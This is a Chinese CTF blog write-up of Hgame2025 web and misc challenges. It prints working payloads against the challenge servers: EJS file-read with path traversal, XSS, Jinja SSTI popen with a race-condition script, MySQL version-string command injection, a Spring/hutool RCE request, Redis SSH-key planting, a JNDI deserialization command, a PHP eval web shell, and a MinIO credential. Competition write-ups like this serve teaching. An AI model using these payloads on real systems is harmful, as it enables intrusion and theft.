<!doctype html><html lang=zh-cn dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Hgame2025-web | 0raN9e's Blog</title><meta name=keywords content="ctf"><meta name=description content="Week1
web
Level 24 Pacman
直接去找源码，控制台赋值
_SCORE=100000
_LIFE=true;
得到之后进行base64,栅栏密码解密
Level 47 BandBomb
上传恶意EJS文件
   创建一个包含EJS代码的文件，内容为读取flag的代码：
aaa.ejs
   <%= process.env.FLAG || require('fs').readFileSync('/flag', 'utf8') %>
使用POST请求上传此文件到/upload接口。"><meta name=author content><link rel=canonical href=http://blog.0ran9e.cn/posts/ctf/hgame2025/><link crossorigin=anonymous href=/assets/css/stylesheet.e145e1800263554e97061ed241e405d710b6a0b880a196a0d6ba58b49d3b9010.css integrity="sha256-4UXhgAJjVU6XBh7SQeQF1xC2oLiAoZag1rpYtJ07kBA=" rel="preload stylesheet" as=style><link rel=icon href=http://blog.0ran9e.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://blog.0ran9e.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://blog.0ran9e.cn/favicon-32x32.png><link rel=apple-touch-icon href=http://blog.0ran9e.cn/apple-touch-icon.png><link rel=mask-icon href=http://blog.0ran9e.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=http://blog.0ran9e.cn/posts/ctf/hgame2025/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="http://blog.0ran9e.cn/posts/ctf/hgame2025/"><meta property="og:site_name" content="0raN9e's Blog"><meta property="og:title" content="Hgame2025-web"><meta property="og:description" content="Week1 web Level 24 Pacman 直接去找源码，控制台赋值
_SCORE=100000_LIFE=true; 得到之后进行base64,栅栏密码解密
Level 47 BandBomb 上传恶意EJS文件创建一个包含EJS代码的文件，内容为读取flag的代码：aaa.ejs<%= process.env.FLAG || require('fs').readFileSync('/flag', 'utf8') %> 使用POST请求上传此文件到/upload接口。"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-02-22T00:00:00+00:00"><meta property="article:modified_time" content="2025-02-22T00:00:00+00:00"><meta property="article:tag" content="Ctf"><meta name=twitter:card content="summary"><meta name=twitter:title content="Hgame2025-web"><meta name=twitter:description content="Week1
web
Level 24 Pacman
直接去找源码，控制台赋值
_SCORE=100000
_LIFE=true;
得到之后进行base64,栅栏密码解密
Level 47 BandBomb
上传恶意EJS文件
   创建一个包含EJS代码的文件，内容为读取flag的代码：
aaa.ejs
   <%= process.env.FLAG || require('fs').readFileSync('/flag', 'utf8') %>
使用POST请求上传此文件到/upload接口。"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://blog.0ran9e.cn/posts/"},{"@type":"ListItem","position":2,"name":"文章","item":"http://blog.0ran9e.cn/posts/ctf/"},{"@type":"ListItem","position":3,"name":"Hgame2025-web","item":"http://blog.0ran9e.cn/posts/ctf/hgame2025/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hgame2025-web","name":"Hgame2025-web","description":"Week1 web Level 24 Pacman 直接去找源码，控制台赋值\n_SCORE=100000\r_LIFE=true; 得到之后进行base64,栅栏密码解密\nLevel 47 BandBomb 上传恶意EJS文件\r创建一个包含EJS代码的文件，内容为读取flag的代码：\raaa.ejs\r\u0026lt;%= process.env.FLAG || require(\u0026#39;fs\u0026#39;).readFileSync(\u0026#39;/flag\u0026#39;, \u0026#39;utf8\u0026#39;) %\u0026gt; 使用POST请求上传此文件到/upload接口。\n","keywords":["ctf"],"articleBody":"Week1 web Level 24 Pacman 直接去找源码，控制台赋值\n_SCORE=100000\r_LIFE=true; 得到之后进行base64,栅栏密码解密\nLevel 47 BandBomb 上传恶意EJS文件\r创建一个包含EJS代码的文件，内容为读取flag的代码：\raaa.ejs\r\u003c%= process.env.FLAG || require('fs').readFileSync('/flag', 'utf8') %\u003e 使用POST请求上传此文件到/upload接口。\n发送POST请求到/rename接口，将上传的文件重命名为../views/mortis.ejs：\n{ \"oldName\": \"aaa.ejs\", \"newName\": \"../views/mortis.ejs\" } 这会将恶意模板覆盖到原模板文件。\n访问应用首页/，服务器渲染被覆盖的模板，执行其中的代码并显示flag。\nMysteryMessageBoard \u003cscript\u003e fetch('/flag') .then(res =\u003e res.text()) .then(flag =\u003e { fetch('/', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: \"comment=\" + flag }) }) \u003c/script\u003e 中间需要访问/admin再返回触发\nLevel 25 双面人派对 minio,下载main文件看ida,upx脱壳后直接f12看字符得到密钥这些内容\nmc alias set myminio http://node1.hgame.vidar.club:32395 minio_admin JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs= 然后下载hints里的src\npackage main import ( \"level25/fetch\" \"level25/conf\" \"github.com/gin-gonic/gin\" \"github.com/jpillora/overseer\" ) func main() { fetcher := \u0026fetch.MinioFetcher{ Bucket: conf.MinioBucket, Key: conf.MinioKey, Endpoint: conf.MinioEndpoint, AccessKey: conf.MinioAccessKey, SecretKey: conf.MinioSecretKey, } overseer.Run(overseer.Config{ Program: program, Fetcher: fetcher, }) } func program(state overseer.State) { g := gin.Default() g.StaticFS(\"/\", gin.Dir(\"/\", true)) g.Run(\":8080\") } 由代码得是热加载，直接目录映射，在linux环境进行编译打包上传\nmc cp main myminio/prodbucket/update Level 38475 角落 考察一个cve，apche的2024\nhttp://node1.hgame.vidar.club:32126/admin/usr/local/apache2/app/%2e%2e%2f../../../../../../usr/local/apache2/app/app.py%3f from flask import Flask, request, render_template, render_template_string, redirect import os import templates app = Flask(__name__) pwd = os.path.dirname(__file__) show_msg = templates.show_msg def readmsg(): filename = pwd + \"/tmp/message.txt\" if os.path.exists(filename): f = open(filename, 'r') message = f.read() f.close() return message else: return 'No message now.' @app.route('/index', methods=['GET']) def index(): status = request.args.get('status') if status is None: status = '' return render_template(\"index.html\", status=status) @app.route('/send', methods=['POST']) def write_message(): filename = pwd + \"/tmp/message.txt\" message = request.form['message'] f = open(filename, 'w') f.write(message) f.close() return redirect('index?status=Send successfully!!') @app.route('/read', methods=['GET']) def read_message(): if \"{\" not in readmsg(): show = show_msg.replace(\"{{message}}\", readmsg()) return render_template_string(show) return 'waf!!' if __name__ == '__main__': app.run(host = '0.0.0.0', port = 5000) 打个条件竞争\nimport requests import threading import time url = \"http://node1.hgame.vidar.club:32126/app\" def send_payload(): data = { 'message': '{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /flag\").read()}}' } requests.post(f\"{url}/send\", data=data) def read_message(): resp = requests.get(f\"{url}/read\") if 'waf!!' not in resp.text: print(f\"Success! Response: {resp.text}\") while True: t1 = threading.Thread(target=send_payload) t2 = threading.Thread(target=read_message) t1.start() time.sleep(0.01) t2.start() t1.join() t2.join() time.sleep(0.1) week2 web Level 21096 HoneyPot 非预期\n经过测试可以发现导入数据里面可以随便输入，输入密码的地方输入; /writeflag;#然后再访问/flag之后就可以得到flag\nLevel 21096 HoneyPot_Revenge 是CVE-2024-21096mysqldump\n大致思路就是自己用有漏洞版本的mysql，进行远程连接得到shell执行\n在 MySQL 命令行中，\\! 用于执行外部命令，比如\nmysql\u003e \\! mysql -u username -p database_name \u003c backup_file.sql 因此\nsudo apt-get install -y build-essential cmake bison libncurses5-dev libtirpc-dev libssl-dev pkg-config\rwget https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-boost-8.0.34.tar.gz\rtar -zxvf mysql-boost-8.0.34.tar.gz\rcd mysql-8.0.34\rroot@dkcjbRCmYFsaLJs:~/mysql-8.0.34/include# vim mysql_version.h.in\r#define MYSQL_SERVER_VERSION \"8.0.0-injection-test\\n\\\\! /writeflag\" 然后进行编译(时间较长，浮现的时候可以干些其他的事)\nmkdir build cd build cmake .. -DDOWNLOAD_BOOST=1 -DWITH_BOOST=../boost make -j$(nproc) sudo make install sudo groupadd mysql sudo useradd -r -g mysql -s /bin/false mysql sudo /usr/local/mysql/bin/mysqld --initialize --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data sudo chown -R mysql:mysql /usr/local/mysql sudo chown -R mysql:mysql /usr/local/mysql/data sudo /usr/local/mysql/bin/mysqld_safe --user=mysql \u0026 /usr/local/mysql/bin/mysql -u root 自己重新设置一个密码\nFLUSH PRIVILEGES; ALTER USER 'root'@'localhost' IDENTIFIED BY '123456'; FLUSH PRIVILEGES; EXIT; 在cnf配置运行\n[mysqld] bind-address = 0.0.0.0 为了安全起见创建一个用户\nCREATE USER 'remote_user'@'%' IDENTIFIED BY '123456'; GRANT ALL PRIVILEGES ON *.* TO 'remote_user'@'%' WITH GRANT OPTION; FLUSH PRIVILEGES; 这里是检测\n用SELECT user, host FROM mysql.user WHERE user = 'remote_user';检查\nLevel 60 SignInJava 动态注册恶意Bean实现RCE\n审计一下代码(由于不会java所以和其他师傅要wp分析的，厌蠢症患者勿骂)\n（Controller），用于处理POST请求，接受客户端传来的JSON数据，解析并根据指定的bean和方法名反射调用相应的服务方法\n@RequestMapping(value = {\"/gateway\"}, method = {RequestMethod.POST}) @ResponseBody public BaseResponse doPost(HttpServletRequest request) throws Exception { String body = IOUtils.toString(request.getReader()); Map\u003cString, Object\u003e map = (Map) JSON.parseObject(body, Map.class); String beanName = (String) map.get(\"beanName\"); String methodName = (String) map.get(JsonEncoder.METHOD_NAME_ATTR_NAME); Map\u003cString, Object\u003e params = (Map) map.get(\"params\"); 使用IOUtils.toString(request.getReader())读取HTTP请求体。\n将请求体解析为JSON对象，并转化为Map类型。\n从解析后的map中获取beanName、methodName和params，这些是后续反射调用所需的信息。\nif (StrUtil.containsAnyIgnoreCase(beanName, \"flag\")) { return new BaseResponse(403, \"flagTestService offline\", null); } 如果beanName包含\"flag\"字样（不区分大小写），返回403错误，提示\"flagTestService offline\"。这可能是为了防止某些特殊请求（如安全相关的标志获取等）。后面的代码是反射调用和异常处理\n实现了一个名为 InvokeUtils 的工具类，主要用于动态反射调用Spring容器中的bean方法。该工具类通过反射获取指定bean的方法，并根据请求的参数动态地构建方法参数进行调用。\n@Lazy private static final Filter autoTypeFilter = JSONReader.autoTypeFilter((String[]) ((Set) Arrays.stream(SpringContextHolder.getApplicationContext().getBeanDefinitionNames()) .map(name -\u003e { int secondDotIndex = name.indexOf(46, name.indexOf(46) + 1); if (secondDotIndex != -1) { return name.substring(0, secondDotIndex + 1); } return null; }) .filter((v0) -\u003e { return Objects.nonNull(v0); }) .collect(Collectors.toSet())).toArray(new String[0])); @Lazy：autoTypeFilter会在第一次使用时进行初始化，避免提前加载，优化启动时间。\nautoTypeFilter：通过扫描Spring应用上下文中的所有bean名称，提取每个bean名的前缀（即包路径的一部分），并用于在JSON.parseObject方法中作为过滤器。为了防止反序列化时不安全的类型被引入\npublic static Object invokeBeanMethod(String beanName, String methodName, Map\u003cString, Object\u003e params) throws Exception { Object beanObject = SpringContextHolder.getBean(beanName); Method beanMethod = (Method) Arrays.stream(beanObject.getClass().getMethods()).filter(method -\u003e { return method.getName().equals(methodName); }).findFirst().orElse(null); 获取Bean：通过SpringContextHolder.getBean(beanName)获取Spring容器中的bean实例。\n获取方法：通过Arrays.stream(beanObject.getClass().getMethods())获取所有方法并通过method.getName().equals(methodName)来找到匹配的方法。若找不到，返回null\nif (beanMethod.getParameterCount() == 0) { return beanMethod.invoke(beanObject, new Object[0]); } String[] parameterTypes = new String[beanMethod.getParameterCount()]; Object[] parameterArgs = new Object[beanMethod.getParameterCount()]; for (int i = 0; i \u003c beanMethod.getParameters().length; i++) { Class\u003c?\u003e parameterType = beanMethod.getParameterTypes()[i]; String parameterName = beanMethod.getParameters()[i].getName(); parameterTypes[i] = parameterType.getName(); if (!parameterType.isPrimitive() \u0026\u0026 !Date.class.equals(parameterType) \u0026\u0026 !Long.class.equals(parameterType) \u0026\u0026 !Integer.class.equals(parameterType) \u0026\u0026 !Boolean.class.equals(parameterType) \u0026\u0026 !Double.class.equals(parameterType) \u0026\u0026 !Float.class.equals(parameterType) \u0026\u0026 !Short.class.equals(parameterType) \u0026\u0026 !Byte.class.equals(parameterType) \u0026\u0026 !Character.class.equals(parameterType) \u0026\u0026 !String.class.equals(parameterType) \u0026\u0026 !List.class.equals(parameterType) \u0026\u0026 !Set.class.equals(parameterType) \u0026\u0026 !Map.class.equals(parameterType)) { 对于有参数的方法，首先解析出方法的参数类型和参数名称，并且构建一个参数数组parameterArgs来存放实际参数。\nif (!parameterType.isPrimitive() \u0026\u0026 !Date.class.equals(parameterType) \u0026\u0026 !Long.class.equals(parameterType) \u0026\u0026 !Integer.class.equals(parameterType) \u0026\u0026 !Boolean.class.equals(parameterType) \u0026\u0026 !Double.class.equals(parameterType) \u0026\u0026 !Float.class.equals(parameterType) \u0026\u0026 !Short.class.equals(parameterType) \u0026\u0026 !Byte.class.equals(parameterType) \u0026\u0026 !Character.class.equals(parameterType) \u0026\u0026 !String.class.equals(parameterType) \u0026\u0026 !List.class.equals(parameterType) \u0026\u0026 !Set.class.equals(parameterType) \u0026\u0026 !Map.class.equals(parameterType)) { if (params.containsKey(parameterName)) { parameterArgs[i] = JSON.parseObject(JSON.toJSONString(params.get(parameterName)), (Class) parameterType, autoTypeFilter, new JSONReader.Feature[0]); } else { try { parameterArgs[i] = JSON.parseObject(JSON.toJSONString(params), (Class) parameterType, autoTypeFilter, new JSONReader.Feature[0]); } catch (JSONException e) { for (Map.Entry\u003cString, Object\u003e entry : params.entrySet()) { Object value = entry.getValue(); if ((value instanceof String) \u0026\u0026 ((String) value).contains(\"\\\"\")) { params.put(entry.getKey(), JSON.parse((String) value)); } } parameterArgs[i] = JSON.parseObject(JSON.toJSONString(params), (Class) parameterType, autoTypeFilter, new JSONReader.Feature[0]); } } } else { parameterArgs[i] = params.getOrDefault(parameterName, null); } 如果方法参数类型不是基础类型（如String, Integer, List等），则尝试使用Fastjson的parseObject将params中的相应字段反序列化为目标参数类型。\n使用autoTypeFilter：在反序列化过程中，使用autoTypeFilter来避免类型安全问题。 如果params中不存在该参数名，则尝试将整个params映射到目标类型。 如果解析失败（JSONException），则通过递归尝试解析参数内嵌的JSON字符串。 对于基础类型（包括String、Integer、Boolean等），直接从params中获取对应的值。\nreturn beanMethod.invoke(beanObject, parameterArgs); 这个是触发点，利用下面这个类\npackage cn.hutool.core.util; import cn.hutool.core.exceptions.UtilException; import cn.hutool.core.io.IORuntimeException; import cn.hutool.core.io.IoUtil; import cn.hutool.core.lang.Pid; import cn.hutool.core.text.StrBuilder; import java.io.Closeable; import java.io.File; import java.io.IOException; import java.io.InputStream; import java.nio.charset.Charset; import java.util.ArrayList; import java.util.List; import java.util.Stack; /* loaded from: SigninJava.jar:BOOT-INF/lib/hutool-all-5.8.33.jar:cn/hutool/core/util/RuntimeUtil.class */ public class RuntimeUtil { public static String execForStr(String... cmds) throws IORuntimeException { return execForStr(CharsetUtil.systemCharset(), cmds); } public static String execForStr(Charset charset, String... cmds) throws IORuntimeException { return getResult(exec(cmds), charset); } public static List\u003cString\u003e execForLines(String... cmds) throws IORuntimeException { return execForLines(CharsetUtil.systemCharset(), cmds); } public static List\u003cString\u003e execForLines(Charset charset, String... cmds) throws IORuntimeException { return getResultLines(exec(cmds), charset); } public static Process exec(String... cmds) { try { Process process = new ProcessBuilder(handleCmds(cmds)).redirectErrorStream(true).start(); return process; } catch (IOException e) { throw new IORuntimeException(e); } } public static Process exec(String[] envp, String... cmds) { return exec(envp, null, cmds); } public static Process exec(String[] envp, File dir, String... cmds) { try { return Runtime.getRuntime().exec(handleCmds(cmds), envp, dir); } catch (IOException e) { throw new IORuntimeException(e); } } public static List\u003cString\u003e getResultLines(Process process) { return getResultLines(process, CharsetUtil.systemCharset()); } public static List\u003cString\u003e getResultLines(Process process, Charset charset) { InputStream in = null; try { in = process.getInputStream(); List\u003cString\u003e list = (List) IoUtil.readLines(in, charset, new ArrayList()); IoUtil.close((Closeable) in); destroy(process); return list; } catch (Throwable th) { IoUtil.close((Closeable) in); destroy(process); throw th; } } public static String getResult(Process process) { return getResult(process, CharsetUtil.systemCharset()); } public static String getResult(Process process, Charset charset) { InputStream in = null; try { in = process.getInputStream(); String read = IoUtil.read(in, charset); IoUtil.close((Closeable) in); destroy(process); return read; } catch (Throwable th) { IoUtil.close((Closeable) in); destroy(process); throw th; } } public static String getErrorResult(Process process) { return getErrorResult(process, CharsetUtil.systemCharset()); } public static String getErrorResult(Process process, Charset charset) { InputStream in = null; try { in = process.getErrorStream(); String read = IoUtil.read(in, charset); IoUtil.close((Closeable) in); destroy(process); return read; } catch (Throwable th) { IoUtil.close((Closeable) in); destroy(process); throw th; } } public static void destroy(Process process) { if (null != process) { process.destroy(); } } public static void addShutdownHook(Runnable hook) { Runtime.getRuntime().addShutdownHook(hook instanceof Thread ? (Thread) hook : new Thread(hook)); } public static int getProcessorCount() { int cpu = Runtime.getRuntime().availableProcessors(); if (cpu \u003c= 0) { cpu = 7; } return cpu; } public static long getFreeMemory() { return Runtime.getRuntime().freeMemory(); } public static long getTotalMemory() { return Runtime.getRuntime().totalMemory(); } public static long getMaxMemory() { return Runtime.getRuntime().maxMemory(); } public static long getUsableMemory() { return (getMaxMemory() - getTotalMemory()) + getFreeMemory(); } public static int getPid() throws UtilException { return Pid.INSTANCE.get(); } private static String[] handleCmds(String... cmds) { if (ArrayUtil.isEmpty((Object[]) cmds)) { throw new NullPointerException(\"Command is empty !\"); } if (1 == cmds.length) { String cmd = cmds[0]; if (StrUtil.isBlank(cmd)) { throw new NullPointerException(\"Command is blank !\"); } cmds = cmdSplit(cmd); } return cmds; } private static String[] cmdSplit(String cmd) { List\u003cString\u003e cmds = new ArrayList\u003c\u003e(); int length = cmd.length(); Stack\u003cCharacter\u003e stack = new Stack\u003c\u003e(); boolean inWrap = false; StrBuilder cache = StrUtil.strBuilder(); for (int i = 0; i \u003c length; i++) { char c = cmd.charAt(i); switch (c) { case ' ': if (inWrap) { cache.append(c); break; } else { cmds.add(cache.toString()); cache.reset(); break; } case '\\\"': case '\\'': if (inWrap) { if (c == stack.peek().charValue()) { stack.pop(); inWrap = false; } cache.append(c); break; } else { stack.push(Character.valueOf(c)); cache.append(c); inWrap = true; break; } default: cache.append(c); break; } } if (cache.hasContent()) { cmds.add(cache.toString()); } return (String[]) cmds.toArray(new String[0]); } } POST /api/gateway HTTP/1.1 Host: node1.hgame.vidar.club:31791 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Content-Type: application/json {\"beanName\":\"cn.hutool.extra.spring.SpringUtil\",\"methodName\":\"registerBean\",\"params\":{\"arg0\":\"shell\",\"arg1\":{\"@type\":\"cn.hutool.core.util.RuntimeUtil\"}}} {\"beanName\":\"shell\",\"methodName\":\"execForStr\",\"params\":{\"arg0\":\"utf8\",\"arg1\":[\"whoami\"]}} POST /api/gateway HTTP/1.1 Host: node1.hgame.vidar.club:31791 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Content-Type: application/json {\"beanName\":\"shell\",\"methodName\":\"execForStr\",\"params\":{\"arg0\":\"utf8\",\"arg1\":[\"/readflag\"]}} Level 257 日落的紫罗兰 nmap可以扫一下这两个端口，一个是ssh，一个是redis,redis无密码\n首先的思路是对ssh进行爆破，利用hydra利用字典看看能不能爆出来，没有成功。\n尝试之后ssh连接不了，redis里面没东西，题目给了user.txt，可以尝试写个id_rsa上去\nssh-keygen -t rsa (echo -e “\\n\\n”; cat ./id_rsa.pub; echo -e “\\n\\n”) \u003e spaced_key.txt cat spaced_key.txt |redis-cli -h node1.hgame.vidar.club -p 30877 -x set ssh_key #将 SSH 公钥存储到 Redis 的 ssh_key 键下。 ![2025-02-22203924](\\2025-02-22203924.png)└─$ redis-cli -h node1.hgame.vidar.club -p 30877 node1.hgame.vidar.club:30877\u003e config set dir /home/mysid/.ssh OK node1.hgame.vidar.club:30877\u003e config set dbfilename \"authorized_keys\" OK node1.hgame.vidar.club:30877\u003e save OK node1.hgame.vidar.club:30877\u003e exit 将 Redis 数据存储在 authorized_keys 文件中，了利用 Redis 来管理 SSH 公钥，从而实现远程身份验证。\nssh -i id_rsa mysid@node1.hgame.vidar.club -p 30156 scp -i ./id_rsa -P 30156 /JNDIMap-0.0.1.jar mysid@node1.hgame.vidar.club:/tmp /usr/local/openjdk-8/bin/java -jar /tmp/JNDIMap-0.0.1.jar -i 127.0.0.1 -l 389 -u \"/Deserialize/Jackson/Command/Y2htb2QgNzc3IC9mbGFn\" 再开个窗口先ssh\ncurl -X POST -d \"baseDN=a/b\u0026filter=a\" http://127.0.0.1:8080/search 最后就可以cat /flag了(：\nLevel 111 不存在的车厢 长度字段使用 uint16（2字节），限制单个字段最大为 65535 字节，所以当⼀个⼤于uint16最⼤值的Length被序列化时会 产⽣整数溢出，改变序列化后的语义 H111协议存在pipeline以及连接复⽤，前⾯搁置的部分数据会被按照第⼆个 请求解析并响应，在外部第⼆个请求打到proxy的时候，有⼀定概率复⽤同个连接并⾛私出这⼀部分 response\nfunc TestGenRequest(t *testing.T) { // 创建一个包含完整信息的测试请求 testReq := \u0026http.Request{ Method: \"POST\", RequestURI: \"/flag\", Header: map[string][]string{ \"Content-Type\": {\"application/json\"}, \"User-Agent\": {\"test-client\"}, }, Body: io.NopCloser(strings.NewReader(\"test body\")), } // 序列化请求 var buf bytes.Buffer err := WriteH111Request(\u0026buf, testReq) if err != nil { t.Fatalf(\"expected no error, got %v\", err) } // 打印序列化后的二进制数据长度和十六进制表示 t.Logf(\"Serialized length: %d bytes\", len(buf.Bytes())) t.Logf(\"Hex dump: %s\", hex.EncodeToString(buf.Bytes())) 放在protocol/request_test.go，通过gotest-v拿到输出\n最后放yakit里\nMisc Computer cleaner 正常导入vm\n搜索危险函数\ngrep -rn \"eval(\" /var/www/html /var/www/html/uploads/shell.php:1:\u003c?php @eval($_POST['hgame{y0u_']);?\u003e 然后看/var/log里面的日志\n有一天是121.41.34.25访问得到第二部分flag\n第三部分也是看日志\n1.41.34.25 - - [17/Jan/2025:12:02:05 +0000] \"GET /uploads/shell.php?cmd=cat%20~/Documents/flag_part3 HTTP/1.1\" 200 2048 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36\" vidar@vidar-computer:/var/www/html$ cat ~/Documents/flag_part3 _c0mput3r!} 最后得到\nhgame{y0u_hav3_cleaned_th3_c0mput3r!} Computer cleaner plus 进行ps发现denied，查看一下发现后门\nhgame{B4ck_D0_oR}\n","wordCount":"3805","inLanguage":"zh-cn","datePublished":"2025-02-22T00:00:00Z","dateModified":"2025-02-22T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.0ran9e.cn/posts/ctf/hgame2025/"},"publisher":{"@type":"Organization","name":"0raN9e's Blog","logo":{"@type":"ImageObject","url":"http://blog.0ran9e.cn/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=http://blog.0ran9e.cn/ accesskey=h title="0raN9e's Blog (Alt + H)">0raN9e's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://blog.0ran9e.cn/ title=首页><span>首页</span></a></li><li><a href=http://blog.0ran9e.cn/archives/ title=归档><span>归档</span></a></li><li><a href=http://blog.0ran9e.cn/tags/ title=标签><span>标签</span></a></li><li><a href=http://blog.0ran9e.cn/search/ title=搜索><span>搜索</span></a></li><li><a href=http://blog.0ran9e.cn/about/ title=关于><span>关于</span></a></li><li><a href=http://blog.0ran9e.cn/links/ title=友链><span>友链</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><span title='2025-02-22 00:00:00 +0000 UTC'>February 22, 2025</span>&nbsp;·&nbsp;<span>8 min</span><h1 class=post-title>Hgame2025-web</h1></header><div class=pm-layout><div class=pm-main><div class=post-content><h1 id=week1>Week1</h1><h2 id=web>web</h2><h3 id=level-24-pacman>Level 24 Pacman</h3><p>直接去找源码，控制台赋值</p><pre tabindex=0><code>_SCORE=100000
_LIFE=true;
</code></pre><p>得到之后进行base64,栅栏密码解密</p><h3 id=level-47-bandbomb>Level 47 BandBomb</h3><pre tabindex=0><code>上传恶意EJS文件
   创建一个包含EJS代码的文件，内容为读取flag的代码：
aaa.ejs
   &lt;%= process.env.FLAG || require(&#39;fs&#39;).readFileSync(&#39;/flag&#39;, &#39;utf8&#39;) %&gt;
</code></pre><p>使用POST请求上传此文件到<code>/upload</code>接口。</p><p>发送POST请求到<code>/rename</code>接口，将上传的文件重命名为<code>../views/mortis.ejs</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;oldName&#34;</span>: <span style=color:#e6db74>&#34;aaa.ejs&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;newName&#34;</span>: <span style=color:#e6db74>&#34;../views/mortis.ejs&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>这会将恶意模板覆盖到原模板文件。</p><p>访问应用首页<code>/</code>，服务器渲染被覆盖的模板，执行其中的代码并显示flag。</p><h3 id=mysterymessageboard>MysteryMessageBoard</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>script</span>&gt;
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fetch</span>(<span style=color:#e6db74>&#39;/flag&#39;</span>)
</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>then</span>(<span style=color:#a6e22e>res</span> =&gt; <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>text</span>())
</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>then</span>(<span style=color:#a6e22e>flag</span> =&gt; {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>fetch</span>(<span style=color:#e6db74>&#39;/&#39;</span>, {
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>method</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;POST&#39;</span>,
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>headers</span><span style=color:#f92672>:</span> {<span style=color:#e6db74>&#39;Content-Type&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;application/x-www-form-urlencoded&#39;</span>},
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>body</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;comment=&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>flag</span>
</span></span><span style=display:flex><span>            })
</span></span><span style=display:flex><span>        })
